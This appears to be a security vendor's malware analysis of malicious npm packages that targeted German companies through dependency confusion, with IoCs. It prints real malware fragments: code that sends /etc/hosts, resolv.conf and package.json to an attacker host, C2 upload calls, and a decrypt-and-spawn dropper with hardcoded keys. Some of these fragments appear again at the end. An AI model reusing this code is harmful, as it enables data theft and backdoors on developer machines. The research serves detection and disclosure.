@@ -1,0 +1,294 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214445_110561\npmsupplychainattacktargetingGermanybasedcompanies863x3001.png
+
+Update May 11th: Following the publication of this blog post, a penetration testing company called “Code White” took responsibility for this dependency confusion attack
+The JFrog Security research team constantly monitors the npm and PyPI ecosystems for malicious packages that may lead to widespread software supply chain attacks. Last month, we shared a widespread npm attack that targeted users of Azure npm packages.
+Over the past three weeks, our automated scanners have detected several malicious packages in the npm registry, all using the same payload. Compared with most malware found in the npm repository, this payload seems particularly dangerous: a highly-sophisticated, obfuscated piece of malware that acts as a backdoor and allows the attacker to take total control over the infected machine. Furthermore, this malware seems to be an in-house development, and not based on publicly-available tools.
+We set out to research this malware to understand its targets and capabilities. In this blog post, we share our technical analysis findings, as well as thoughts on the potential attackers.
+Who is targeted by the new npm supply chain attack?
+In our research of the payload found in the detected malicious packages, we were surprised to discover that this attack seems to be highly targeted against a number of prominent companies based in Germany.
+We spotted four “maintainers” that were created to host the malicious packages:
+
+bertelsmannnpm
+boschnodemodules
+stihlnodemodules
+dbschenkernpm
+We immediately reported all packages related to “bertelsmannnpm”, “stihlnodemodules” and “dbschenkernpm” to the npm maintainers as malware. “boschnodemodules” was already removed from the registry at the time of writing this blog.
+Specifically, the packages were reported 4 hours after their creation.
+From these maintainer names and from the package names chosen, it seems highly likely that this is a dependency confusion attack against the respective German industrial companies.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214445_110561\1_Bertelsmannnpm.png
+
+Furthermore, we found that just a few packages were provided by these “maintainers” and the package names are very specific. This may indicate that the attackers did early reconnaissance to learn which packages are in the private repositories of the companies being attacked – a critical step for a successful dependency confusion attack.
+All packages related to “bertelsmannnpm” were removed on May 3rd (a day after our report), the “dbschenkernpm” packages were removed on May 11th and “stihlnodemodules” packages are still live as of now.
+Note that the “stihlnodemodules” packages are currently on version 0.0.0 that contains no malicious code, but we believe the previous version (1.0.0) contained the same malicious payload as all the other reported packages, due to the package timestamps and naming convention.
+How does the malware work?
+After initial analysis of some of the malicious payloads, we realized they belong to the same malware family of the previously reported “gxm-reference-web-auth-server” malicious package, which was analyzed thoroughly in a blog post by Snyk. We will explain some of the malware’s high-level details here and further details can be found in Snyk’s post.
+The malware consists of two parts – a dropper and a payload.
+The dropper
+The dropper exfiltrates information about the infected machine to the malware’s “telemetry” server (by default hosted at www.pkgio.com) through HTTPS and DNS. This information contains the victim’s username, hostname, and the content of the files “/etc/hosts” and “/etc/resolv.conf”.
+topostfiles = ['package.json', '/etc/hosts', '/etc/resolv.conf']
+ for (var file_path of topostfiles) {
+   if (fs.existsSync(file_path)) {
+     contents = fs.readFileSync(file_path, { encoding: 'base64' })
+     try {
+       axios({
+         method: 'post',
+         url: 'https://www' + telemetry + '/' + file_path,
+         data: { data: contents },
+         httpsAgent: agent,
+         maxBodyLength: Infinity,
+         maxContentLength: Infinity,
+       }).catch(function (_0x1791c9) {})
+     } catch {}
+   }
+ }
+Listing 1. Files exfiltration
+After exfiltrating this information, the dropper decrypts and executes a malicious payload. Depending on the configuration, the payload can either be a Javascript-based payload or a native binary compiled for the target platform:
+const _0x340385 = spawn('node', ['obfusc.dec.js'], {
+   cwd: process.cwd(),
+   detached: true,
+   stdio: 'ignore',
+   windowsHide: true,
+})
+Listing 2. Javascript payload execution
+const _0x3b87fe = spawnSync(path.join(process.cwd(), 'win.dec.js'), {
+   cwd: process.cwd(),
+})
+Listing 3. Native payload execution
+The payload
+As mentioned, the payload is dynamic and different versions of the malicious package may be shipped with different payloads. However, in the malicious packages we observed, we always saw the same type of basic Javascript payload (“obfusc.enc.js”).
+The payload is a backdoor, an HTTPS client, which registers itself on startup to a hardcoded C2 server and receives commands from it. The payload does not seem to have any persistence mechanisms built into it (will not persist after reboot).
+uploaddatastring = JSON.stringify(uploaddata)
+uploaddataencrypted = encrypt_string(
+   key,
+   iv,
+   uploaddatastring
+)
+_0x2356ae({
+   method: 'post',
+   url: c2c_domain + '/callbackupload',
+   data: {
+       identity: guid,
+       data: uploaddataencrypted,
+   },
+   headers: { 'User-Agent': useragent },
+   httpsAgent: useragent,
+   maxBodyLength: null,
+   maxContentLength: null
+})
+Listing 4. HTTPS communication
+Once communications are established with the C2 server, the payload can accept the following commands:
+
+download – payload will download a file from the C2 server
+upload – payload will upload a file to the C2 server, at endpoint “callbackupload”
+eval – evaluate arbitrary Javascript code
+exec – execute a local binary
+delete – terminate the process
+register – Initial registration of the payload on the C2 server
+Configurable parameters
+
+The dropper decrypts a payload using the AES-256 algorithm with hardcoded keys. Every package has its own set of Key/IV used for both payload decryption and communication encryption/decryption. This means the attackers generated each malware instance automatically by using a builder:
+key = 'UisUZAfOwYrsvlgehZGhOUAGwUpjGQxk'
+iv = 'HVrHfWdcOPANisKZ'
+if (process.platform.includes('darwin')) {
+ if (fs.existsSync('mac.enc.js')) {
+   contents = fs.readFileSync('mac.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('mac.dec.js', decrypted, {
+     encoding: 'base64',
+     mode: 493,
+   })
+   const mac_process = spawnSync(path.join(process.cwd(), 'mac.dec.js'), {
+     cwd: process.cwd(),
+   })
+ } else {
+   startdefault(key, iv, _0x2277ed)
+ }
+} else {
+ if (process.platform.includes('win')) {
+   if (fs.existsSync('win.enc.js')) {
+     contents = fs.readFileSync('win.enc.js', { encoding: 'base64' })
+     decrypted = decryptstring(key, iv, contents)
+     fs.writeFileSync('win.dec.js', decrypted, {
+       encoding: 'base64',
+       mode: 493,
+     })
+     const _0x44b0a2 = spawnSync(path.join(process.cwd(), 'win.dec.js'), {
+       cwd: process.cwd(),
+     })
+   }
+ }
+}
+Listing 5. Key/IV mechanism and OS-dependent payloads
+The malware has builds for all popular platforms and the default (multiplatform) payload. We expect that the builder allows choosing a target platform for the attack:
+
+
+// Default (Javascript)
+contents = fs.readFileSync('obfusc.enc.js', { encoding: 'base64' })
+decrypted = decryptstring(_0x3ef2f5, _0x2c36a8, contents)
+fs.writeFileSync('obfusc.dec.js', decrypted, { encoding: 'base64' })
+ 
+// MacOS
+if (process.platform.includes('darwin')) {
+   contents = fs.readFileSync('mac.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('mac.dec.js', decrypted, {
+...
+// Windows
+if (process.platform.includes('win')) {
+if (fs.existsSync('win.enc.js')) {
+   contents = fs.readFileSync('win.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('win.dec.js', decrypted, {
+...
+ 
+// Linux
+if (fs.existsSync('lin.enc.js')) {
+contents = fs.readFileSync('lin.enc.js', { encoding: 'base64' })
+decrypted = decryptstring(key, iv, contents)
+...
+The payload contains an engine parameter which it sends to the C2 server as a first request to the /register endpoint. This request contains the parameter 'engine': 'nodejs', from which we can deduce that the payload can be compiled to other languages as well.
+The curious decision of using public obfuscation
+The only part of the malware which doesn’t seem custom-coded, is the malware’s obfuscation. Both the dropper and the payload are obfuscated using the ubiquitous javascript-obfuscator package:
+function a0_0x1cc7(_0x59e1fe, _0x2cda1e) {
+    const _0x1da327 = a0_0x1da3();
+    return a0_0x1cc7 = function(_0x1cc793, _0xcebe14) {
+        _0x1cc793 = _0x1cc793 - 0xd1;
+        let _0x13320c = _0x1da327[_0x1cc793];
+        return _0x13320c;
+    }, a0_0x1cc7(_0x59e1fe, _0x2cda1e);
+}
+...
+const semver = require('semver'),
+    os = require('os'),
+    fs = require('fs'),
+    axios = require(a0_0x514c75(0xda)),
+    crypto = require(a0_0x514c75(0x14b));
+var dns = require(a0_0x514c75(0xdd)),
+    path = require(a0_0x514c75(0x146));
+telemetry = '.pkgio.com';
+const https = require('https'),
+    {
+        spawnSync
+    } = require(a0_0x514c75(0xf4)),
+    {
+        spawn
+    } = require(a0_0x514c75(0xf4)),
+    mypackage = '@bertelsmanncollaborationplatform/
+...
+Listing 6. Malware code obfuscated by the “javascript-obfuscator” (“confsettingsaaa.js”)
+This is a very poor decision from the malware author’s part, since:
+
+A public obfuscator can be easily “signed” and subsequently the obfuscated code can be tagged as such
+There are publicly available tools that can deobfuscate well-known obfuscations
+Indeed, having a post-install command that runs obfuscated Javascript is an extremely strong indicator of a malicious npm package:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214445_110561\2_Listing7.png
+
+Listing 7. Package.json of one of the malicious packages
+The attacker – malicious threat actor or pentester?
+Currently, we are not sure who is the actor behind these supply chain attacks (although we are investigating this issue and have some concrete leads).
+On one hand, we have strong indicators of a sophisticated real threat actor:
+
+All used code is custom
+The attack is highly targeted and relies on difficult-to-get insider information (the private package names)
+The payload is extremely malicious, and contains features that aren’t needed in a simple pentest (e.g. dynamic configuration parameters)
+The uploaded packages had no descriptions or any indications that they are being used for pentesting purposes
+On the other hand, some indicators might suggest this is a (very aggressive!) penetration test:
+
+The usernames created in the npm registry did not try to hide the targeted company
+The obfuscator used was a public one, which can be easily detected and reversed
+Appendix A: IoCs
+
+
+HTTPS paths	*/callbackupload
+*/callbacknode
+*/register
+*/updateinfosnodejs
+https://www.pkgio.com/
+DNS	*.pkgio[.]com
+cdn[.]game-note[.]com
+*.game-note[.]com
+IP	82[.]196[.]7[.]23
+82[.]196[.]15[.]238
+e-mails	bertelsmannnpm@protonmail.com
+
+boschnodemodules@protonmail.com
+
+dbschenkernpm@protonmail.com
+
+stihlnodemodules@protonmail.com
+Stay up-to-date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research website and on Twitter at @JFrogSecurity.
+Secure your software supply chain with the JFrog Platform
+Learn how you can leverage the JFrog platform to protect your organization with multiple layers of security against dependency confusion attacks.
+Manage how your software dependencies are resolved and which packages are pulled using JFrog Artifactory. Automatically detect malicious packages in your software with automated scanning using JFrog Xray SCA tool.
+key = 'UisUZAfOwYrsvlgehZGhOUAGwUpjGQxk'
+iv = 'HVrHfWdcOPANisKZ'
+if (process.platform.includes('darwin')) {
+ if (fs.existsSync('mac.enc.js')) {
+   contents = fs.readFileSync('mac.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('mac.dec.js', decrypted, {
+     encoding: 'base64',
+     mode: 493,
+   })
+   const mac_process = spawnSync(path.join(process.cwd(), 'mac.dec.js'), {
+     cwd: process.cwd(),
+   })
+ } else {
+   startdefault(key, iv, _0x2277ed)
+ }
+} else {
+ if (process.platform.includes('win')) {
+   if (fs.existsSync('win.enc.js')) {
+     contents = fs.readFileSync('win.enc.js', { encoding: 'base64' })
+     decrypted = decryptstring(key, iv, contents)
+     fs.writeFileSync('win.dec.js', decrypted, {
+       encoding: 'base64',
+       mode: 493,
+     })
+     const _0x44b0a2 = spawnSync(path.join(process.cwd(), 'win.dec.js'), {
+       cwd: process.cwd(),
+     })
+   }
+ }
+}
+Listing 5. Key/IV mechanism and OS-dependent payloads
+
+// Default (Javascript)
+contents = fs.readFileSync('obfusc.enc.js', { encoding: 'base64' })
+decrypted = decryptstring(_0x3ef2f5, _0x2c36a8, contents)
+fs.writeFileSync('obfusc.dec.js', decrypted, { encoding: 'base64' })
+ 
+// MacOS
+if (process.platform.includes('darwin')) {
+   contents = fs.readFileSync('mac.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('mac.dec.js', decrypted, {
+...
+// Windows
+if (process.platform.includes('win')) {
+if (fs.existsSync('win.enc.js')) {
+   contents = fs.readFileSync('win.enc.js', { encoding: 'base64' })
+   decrypted = decryptstring(key, iv, contents)
+   fs.writeFileSync('win.dec.js', decrypted, {
+...
+ 
+// Linux
+if (fs.existsSync('lin.enc.js')) {
+contents = fs.readFileSync('lin.enc.js', { encoding: 'base64' })
+decrypted = decryptstring(key, iv, contents)
+...
+engine
+/register
+'engine': 'nodejs'
+
+*/callbacknode
+*/register
+*/updateinfosnodejs
+https://www.pkgio.com/
+
+cdn[.]game-note[.]com
+*.game-note[.]com
+
+82[.]196[.]15[.]238
